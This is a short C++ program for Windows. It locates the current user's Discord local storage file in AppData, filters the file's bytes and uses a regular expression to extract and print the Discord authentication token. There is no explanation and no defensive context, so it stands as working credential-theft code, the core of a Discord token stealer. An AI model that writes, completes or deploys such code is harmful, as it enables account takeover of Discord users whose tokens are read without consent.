#include <iostream>
#include <fstream>
#include <string.h>
#include <regex>
#include <windows.h>
#include <Lmcons.h>

using namespace std;

string getUsername(){
  char username[UNLEN+1];
  DWORD username_len = UNLEN+1;
  GetUserName(username, &username_len);
  return (string)username;
}

int main () {
  char character;
  string path = "C:\\Users\\";
  path.append(getUsername());
  path.append("\\AppData\\Roaming\\discord\\Local Storage\\https_discordapp.com_0.localstorage");
  ifstream myfile (path, ios::binary);
  if (!myfile.is_open()){
    cout << "Unable to open file";
    return 1;
  } 
 
  string content;
  while (myfile >> noskipws >> character)
  {
    if((character < 0x20 || character > 0x7E) && character != '\n')continue;
    content += character;
  }
  myfile.close();
  regex pattern ("token.{0,5}\"([^\"]{58,62})\"");
  smatch match;
  regex_search(content, match, pattern);
  string token = match[0];
  token = token.erase(0,5);
  cout << token;
  return 0;
}